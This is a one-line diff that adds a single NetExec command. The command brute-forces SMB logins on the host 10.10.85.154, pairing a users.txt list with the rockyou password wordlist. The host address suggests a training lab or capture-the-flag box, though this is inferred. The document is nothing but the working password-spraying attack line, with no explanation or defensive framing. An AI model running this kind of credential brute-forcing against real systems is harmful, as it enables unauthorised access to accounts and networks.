@@ -1,0 +1,1 @@
+nxc smb 10.10.85.154 -u users.txt -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
